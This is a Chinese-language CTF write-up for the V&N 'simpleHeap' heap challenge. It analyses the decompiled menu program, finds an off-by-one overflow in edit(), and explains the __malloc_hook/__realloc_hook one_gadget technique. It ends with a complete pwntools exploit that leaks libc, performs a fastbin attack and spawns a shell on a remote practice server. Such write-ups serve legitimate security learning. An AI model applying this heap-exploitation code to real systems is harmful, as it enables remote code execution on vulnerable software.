# [V&N] simpleHeap

### 0x0 补偿

算是相对深入的理解了`__malloc_hook`和`__realloc_hook`配合使用`one_gadget`来拿到shell的方法：

首先，这两个变量的位置是临近的：

```shell
pwndbg> x/gx 0x7ffff7dcfc28
0x7ffff7dcfc28 <__realloc_hook>:	0x00007ffff7a7c790
pwndbg> x/gx 0x7ffff7dcfc30
0x7ffff7dcfc30 <__malloc_hook>:	0x0000000000000000
```

然后利用地址错位，可以得到一个`fastbin`范围的`chunk`。就可以配合Fastbin Double Free使用Fastbin Attack了。

```shell
pwndbg> p &__malloc_hook
$2 = (void *(**)(size_t, const void *)) 0x7ffff7dcfc30 <__malloc_hook>
pwndbg> find_fake_fast 0x7ffff7dcfc30 0x7f
FAKE CHUNKS
0x7ffff7dcfc0d FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
  mchunk_prev_size = 18444453504836698112,
  mchunk_size = 127,
  fd = 0xfff7a7b410000000,
  bk = 0xfff7a7c79000007f,
  fd_nextsize = 0x7f,
  bk_nextsize = 0x0
}
pwndbg> x/6gx 0x7ffff7dcfc0d
0x7ffff7dcfc0d <_IO_wide_data_0+301>:	0xfff7dcbd60000000	0x000000000000007f
0x7ffff7dcfc1d:	0xfff7a7b410000000	0xfff7a7c79000007f
0x7ffff7dcfc2d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
pwndbg>
```

另外常用方法是在`__malloc_hook`写入`_libc_realloc`的地址来调用`__realloc_hook`，在`__realloc_hook`写入one_gadget，来拿到shell。

原因在于one_gadget的另外两个参数与寄存器有关，

```shell
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

需要满足要求，所以需要调整栈空间，就可以利用`realloc`来调整栈空间。因为我们观察到在`realloc()`里面,会有很栈的调整在调用`__realloc_hook`之前。

```assembly
.text:0000000000098C30                 push    r15             ; Alternative name is '__libc_realloc'
.text:0000000000098C32                 push    r14
.text:0000000000098C34                 push    r13
.text:0000000000098C36                 push    r12
.text:0000000000098C38                 push    rbp
.text:0000000000098C39                 push    rbx
.text:0000000000098C3A                 sub     rsp, 18h
.text:0000000000098C3E                 mov     rax, cs:__realloc_hook_ptr
.text:0000000000098C45                 mov     rax, [rax]
```

### 0x1 分析

看一下保护：

```shell
[*] './vn_pwn_simpleHeap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护都开着。

程序倒是不复杂，标准的菜单题，增删改查都有：

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  preload();
  puts("Welcome to V&N challange!");
  puts("This's a simple heap for you.");
  while ( 1 )
  {
    menu();
    getNum();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        add();
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        delete();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

`add()`:`chunk`的大小被限制在fastbin的范围。

```c
signed int add()
{
  signed int result; // eax
  int idx; // [rsp+8h] [rbp-8h]
  unsigned int size; // [rsp+Ch] [rbp-4h]

  idx = getIdx(); //最多可以放10个chunk
  if ( idx == -1 )
    return puts("Full");
  printf("size?");
  result = getNum();
  size = result;
  if ( result > 0 && result <= 0x6F )           // fastbin
  {
    PostList[idx] = malloc(result);
    if ( !PostList[idx] )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    sizeList[idx] = size;
    printf("content:");
    read(0, PostList[idx], sizeList[idx]);
    result = puts("Done!");
  }
  return result;
}
```

`edit()`这里`read()`函数不一样了。

```c
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = getNum();
  if ( v1 < 0 || v1 > 9 || !PostList[v1] )
    exit(0);
  printf("content:");
  readUnsafe((__int64)PostList[v1], sizeList[v1]);
  return puts("Done!");
}
```

```c
//readUnsafe()
__int64 __fastcall readUnsafe(__int64 ptr, int nbytes)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = (unsigned int)i;
    if ( i > nbytes )
      break;
    if ( !read(0, (void *)(i + ptr), 1uLL) )
      exit(0);
    if ( *(_BYTE *)(i + ptr) == '\n' )
    {
      result = i + ptr;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

有一个off-by-one的漏洞，可以溢出一个字节的内容，可以修改下一个`chunk`的`size`。

`delete()`没有UAF漏洞。

```c
int delete()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = getNum();
  if ( v1 < 0 || v1 > 9 || !PostList[v1] )
    exit(0);
  free(PostList[v1]);
  PostList[v1] = 0LL;
  sizeList[v1] = 0;
  return puts("Done!");
}
```

`show()`:很常规的输出函数

```c
int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = getNum();
  if ( v1 < 0 || v1 > 9 || !PostList[v1] )
    exit(0);
  puts((const char *)PostList[v1]);
  return puts("Done!");
}
```

#### 漏洞利用

1. 可以用off-by-one漏洞来修改下一个`chunk`的`size`来把`chunk`放到Unsorted bin里，再输出得到`libc`。
2. 然后利用`__malloc_hook`附近的地址错位来伪造一个`chunk`，绕过`fastbin`申请时候对`size`的检查。然后用`Fastbin`的Double Free来劫持`__malloc_hook`和`__realloc_hook`来调整栈，并且使用gadget。（Fastbin Attack）
3. 制造重叠的chunk来操作。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./vn_pwn_simpleHeap')
p = remote('node3.buuoj.cn', 26925)
elf = ELF('./vn_pwn_simpleHeap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadget = 0x4526a
main_arena_offset = 0x3c4b20

def debug(p, cmd):
  gdb.attach(p, cmd)
  pause()

def add(size, content):
  p.sendlineafter('choice: ', '1')
  p.sendlineafter('size?', str(size))
  p.sendafter('content:', content)

def edit(idx, content):
  p.sendlineafter('choice: ', '2')
  p.sendlineafter('idx?', str(idx))
  p.sendafter('content:', content)

def show(idx):
  p.sendlineafter('choice: ', '3')
  p.sendlineafter('idx?', str(idx))

def delete(idx):
  p.sendlineafter('choice: ', '4')
  p.sendlineafter('idx?', str(idx))

# leak libc
add(0x18, 'idx0\n')
add(0x18, 'idx1\n')
add(0x18, 'idx2\n')
add(0x60, 'idx3\n')
add(0x60, 'idx4\n')

edit(0, 'a' * 0x18 + '\x41')
delete(1)
add(0x30, 'idx1')
edit(1, p64(0) * 3 + p64(0x91) + '\n')
delete(2)
# edit(1, 'a' * 0x20)
delete(1)
add(0x30, 'a' * 0x20)
show(1)
p.recvuntil('a' * 0x20)
main_arena = u64(p.recvuntil('\x7f').ljust(8, '\x00'))
libc.address = main_arena - main_arena_offset - 88
success('main_arena : ' + str(hex(main_arena)))
success('libc : ' + str(hex(libc.address)))
# debug(p, '\n')
pause()

# __malloc_hook && gadget
edit(1, p64(0) * 3 + p64(0x91) + '\n')
add(0x60, 'idx2')
delete(2)
edit(1, p64(0) * 3 + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23) + '\n')
add(0x60, 'idx2')
add(0x60, '0' * 0xb + p64(libc.address + gadget) + p64(libc.symbols['__libc_realloc'] + 0xD) + '\n')

#get shell
p.sendlineafter('choice: ', '1')
p.sendlineafter('size?', str(0x60))
p.interactive()
```

### Reference

[通过realloc调整栈帧来满足onegadget](https://blog.csdn.net/Breeze_CAT/article/details/103789081#realloconegadget_23)

[Fastbin Attack 学习](https://xz.aliyun.com/t/7490)

